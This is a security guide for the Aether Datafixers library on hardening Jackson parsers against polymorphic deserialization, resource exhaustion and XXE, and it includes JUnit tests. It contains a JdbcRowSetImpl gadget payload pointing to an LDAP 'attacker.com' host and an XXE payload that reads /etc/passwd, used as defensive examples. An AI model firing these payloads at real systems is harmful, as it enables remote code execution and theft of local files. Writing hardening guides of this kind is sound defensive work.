# Jackson Security

Jackson is used by Aether Datafixers for JSON, YAML, XML, and TOML via `JacksonJsonOps`, `JacksonYamlOps`, `JacksonXmlOps`, and `JacksonTomlOps`. Each format has specific security considerations.

## Overview

| Format | Ops Class        | Risk Level | Key Concerns                        |
|--------|------------------|------------|-------------------------------------|
| JSON   | `JacksonJsonOps` | Medium     | Polymorphic typing, resource limits |
| YAML   | `JacksonYamlOps` | Low-Medium | Fewer features than SnakeYAML       |
| XML    | `JacksonXmlOps`  | **High**   | XXE, Entity expansion               |
| TOML   | `JacksonTomlOps` | Low        | Minimal attack surface              |

---

## Polymorphic Deserialization

### The Vulnerability

Jackson's "default typing" feature allows JSON to specify which Java class to instantiate. This is extremely dangerous with untrusted input:

```java
// DANGEROUS - Never do this with untrusted data
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // VULNERABLE!
```

Attackers can exploit this to execute arbitrary code:

```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/exploit",
  "autoCommit": true
}
```

### Safe Configuration

**Never enable default typing for untrusted data:**

```java
// SAFE - Default configuration (no polymorphic typing)
ObjectMapper mapper = new ObjectMapper();
// Do NOT call enableDefaultTyping() or activateDefaultTyping()
```

**If polymorphic typing is absolutely required**, use an allowlist:

```java
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(
    BasicPolymorphicTypeValidator.builder()
        .allowIfSubType(SafeBaseClass.class)  // Only allow specific types
        .build(),
    ObjectMapper.DefaultTyping.NON_FINAL
);
```

---

## StreamReadConstraints (Jackson 2.15+)

Jackson 2.15+ provides `StreamReadConstraints` to limit resource consumption:

```java
import com.fasterxml.jackson.core.JsonFactory;
import com.fasterxml.jackson.core.StreamReadConstraints;
import com.fasterxml.jackson.databind.ObjectMapper;

StreamReadConstraints constraints = StreamReadConstraints.builder()
    .maxNestingDepth(50)           // Prevent stack overflow
    .maxNumberLength(100)          // Limit number string length
    .maxStringLength(1_000_000)    // 1MB max string
    .maxNameLength(50_000)         // Limit field name length
    .maxDocumentLength(10_000_000) // 10MB max document (Jackson 2.16+)
    .build();

JsonFactory factory = JsonFactory.builder()
    .streamReadConstraints(constraints)
    .build();

ObjectMapper safeMapper = new ObjectMapper(factory);
```

### Constraint Reference

| Constraint          | Default   | Recommended | Purpose                     |
|---------------------|-----------|-------------|-----------------------------|
| `maxNestingDepth`   | 1000      | 50-100      | Prevent stack overflow      |
| `maxStringLength`   | 20MB      | 1-10MB      | Limit memory per string     |
| `maxNumberLength`   | 1000      | 100         | Prevent huge number strings |
| `maxNameLength`     | 50000     | 1000        | Limit field name length     |
| `maxDocumentLength` | unlimited | 10MB        | Total document size         |

---

## XXE Prevention

### The Vulnerability

XML External Entity (XXE) attacks allow attackers to:
- Read local files (`file:///etc/passwd`)
- Perform SSRF (`http://internal-server/`)
- Cause DoS via entity expansion

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### Secure JacksonXmlOps Configuration

```java
import com.fasterxml.jackson.dataformat.xml.XmlFactory;
import com.fasterxml.jackson.dataformat.xml.XmlMapper;
import javax.xml.stream.XMLInputFactory;

public class SecureXmlMapperFactory {

    public static XmlMapper createSecureXmlMapper() {
        // Create secure XMLInputFactory
        XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();

        // Disable external entities (XXE prevention)
        xmlInputFactory.setProperty(
            XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);

        // Disable DTD processing
        xmlInputFactory.setProperty(
            XMLInputFactory.SUPPORT_DTD, false);

        // Disable entity reference replacement
        xmlInputFactory.setProperty(
            XMLInputFactory.IS_REPLACING_ENTITY_REFERENCES, false);

        // Build secure XmlMapper
        return XmlMapper.builder(
            XmlFactory.builder()
                .xmlInputFactory(xmlInputFactory)
                .build()
        ).build();
    }
}

// Usage with JacksonXmlOps
XmlMapper secureMapper = SecureXmlMapperFactory.createSecureXmlMapper();
JacksonXmlOps secureOps = new JacksonXmlOps(secureMapper);
```

### XMLInputFactory Properties Reference

| Property | Value | Purpose |
|----------|-------|---------|
| `IS_SUPPORTING_EXTERNAL_ENTITIES` | `false` | Block external entity loading |
| `SUPPORT_DTD` | `false` | Disable DTD processing entirely |
| `IS_REPLACING_ENTITY_REFERENCES` | `false` | Don't expand entities |
| `IS_VALIDATING` | `false` | Skip DTD validation |

---

## Complete Secure Configurations

### Secure JacksonJsonOps

```java
import com.fasterxml.jackson.core.JsonFactory;
import com.fasterxml.jackson.core.StreamReadConstraints;
import com.fasterxml.jackson.databind.ObjectMapper;
import de.splatgames.aether.datafixers.codec.json.jackson.JacksonJsonOps;

public class SecureJacksonJsonConfig {

    public static JacksonJsonOps createSecureOps() {
        StreamReadConstraints constraints = StreamReadConstraints.builder()
            .maxNestingDepth(50)
            .maxNumberLength(100)
            .maxStringLength(1_000_000)
            .build();

        JsonFactory factory = JsonFactory.builder()
            .streamReadConstraints(constraints)
            .build();

        ObjectMapper mapper = new ObjectMapper(factory);

        return new JacksonJsonOps(mapper);
    }
}

// Usage
JacksonJsonOps secureOps = SecureJacksonJsonConfig.createSecureOps();
JsonNode node = secureOps.mapper().readTree(untrustedJson);
Dynamic<JsonNode> dynamic = new Dynamic<>(secureOps, node);
```

### Secure JacksonYamlOps

```java
import com.fasterxml.jackson.core.StreamReadConstraints;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;
import com.fasterxml.jackson.dataformat.yaml.YAMLMapper;
import de.splatgames.aether.datafixers.codec.yaml.jackson.JacksonYamlOps;

public class SecureJacksonYamlConfig {

    public static JacksonYamlOps createSecureOps() {
        StreamReadConstraints constraints = StreamReadConstraints.builder()
            .maxNestingDepth(50)
            .maxStringLength(1_000_000)
            .build();

        YAMLFactory factory = YAMLFactory.builder()
            .streamReadConstraints(constraints)
            .build();

        YAMLMapper mapper = new YAMLMapper(factory);

        return new JacksonYamlOps(mapper);
    }
}
```

### Secure JacksonXmlOps

```java
import com.fasterxml.jackson.core.StreamReadConstraints;
import com.fasterxml.jackson.dataformat.xml.XmlFactory;
import com.fasterxml.jackson.dataformat.xml.XmlMapper;
import de.splatgames.aether.datafixers.codec.xml.jackson.JacksonXmlOps;
import javax.xml.stream.XMLInputFactory;

public class SecureJacksonXmlConfig {

    public static JacksonXmlOps createSecureOps() {
        // Secure XML parsing
        XMLInputFactory xmlInputFactory = XMLInputFactory.newFactory();
        xmlInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
        xmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        xmlInputFactory.setProperty(XMLInputFactory.IS_REPLACING_ENTITY_REFERENCES, false);

        // Resource limits
        StreamReadConstraints constraints = StreamReadConstraints.builder()
            .maxNestingDepth(50)
            .maxStringLength(1_000_000)
            .build();

        XmlFactory factory = XmlFactory.builder()
            .xmlInputFactory(xmlInputFactory)
            .streamReadConstraints(constraints)
            .build();

        XmlMapper mapper = XmlMapper.builder(factory).build();

        return new JacksonXmlOps(mapper);
    }
}
```

---

## Deserialization Features

Additional security-relevant features:

```java
ObjectMapper mapper = new ObjectMapper();

// Fail on unknown properties (defense in depth)
mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);

// Fail on null for primitives
mapper.configure(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES, true);

// Fail on missing creator properties
mapper.configure(DeserializationFeature.FAIL_ON_MISSING_CREATOR_PROPERTIES, true);
```

---

## Testing Security Configuration

```java
@Test
void rejectsXxeAttack() {
    String xxePayload = """
        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data>&xxe;</data>
        """;

    JacksonXmlOps secureOps = SecureJacksonXmlConfig.createSecureOps();

    assertThrows(Exception.class, () ->
        secureOps.mapper().readTree(xxePayload)
    );
}

@Test
void rejectsDeeplyNestedJson() {
    // Create deeply nested JSON
    StringBuilder json = new StringBuilder();
    for (int i = 0; i < 100; i++) json.append("{\"a\":");
    json.append("1");
    for (int i = 0; i < 100; i++) json.append("}");

    JacksonJsonOps secureOps = SecureJacksonJsonConfig.createSecureOps();

    assertThrows(StreamConstraintsException.class, () ->
        secureOps.mapper().readTree(json.toString())
    );
}
```

---

## Related

- [Threat Model](../threat-model.md)
- [Best Practices](../best-practices.md)
- [JSON Support](../../codec/json.md)
- [XML Support](../../codec/xml.md)
- [YAML Support](../../codec/yaml.md)
